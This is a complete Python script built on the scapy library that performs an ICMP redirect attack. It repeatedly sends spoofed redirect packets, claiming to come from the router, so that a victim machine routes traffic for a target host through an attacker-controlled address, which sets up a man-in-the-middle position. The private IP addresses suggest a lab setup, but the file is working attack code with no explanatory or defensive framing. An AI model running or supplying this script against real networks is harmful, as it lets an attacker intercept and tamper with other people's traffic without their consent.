from scapy.all import *
import time

# Network configuration
victim_ip = "192.168.56.20"
router_ip = "192.168.56.1"
attacker_ip = "192.168.56.10"
target_ip = "192.168.56.100"

print("[*] Starting ICMP Redirect attack...")
print(f"[*] Victim: {victim_ip}")
print(f"[*] Router: {router_ip}")
print(f"[*] Attacker: {attacker_ip}")
print(f"[*] Target: {target_ip}")

# Wait a bit for victim to establish initial route
time.sleep(5)

while True:
    try:
        # Create the original packet that would trigger the redirect
        # This simulates the packet from victim to target
        original_packet = IP(src=victim_ip, dst=target_ip) / ICMP()
        
        # Create ICMP redirect packet
        # Type 5 = Redirect, Code 1 = Redirect for host
        redirect_packet = IP(src=router_ip, dst=victim_ip) / \
                         ICMP(type=5, code=1, gw=attacker_ip) / \
                         original_packet
        
        send(redirect_packet, verbose=0)
        print(f"[*] Sent ICMP redirect to {victim_ip} -> route {target_ip} via {attacker_ip}")
        
    except Exception as e:
        print(f"[!] Error sending packet: {e}")
    
    time.sleep(2)
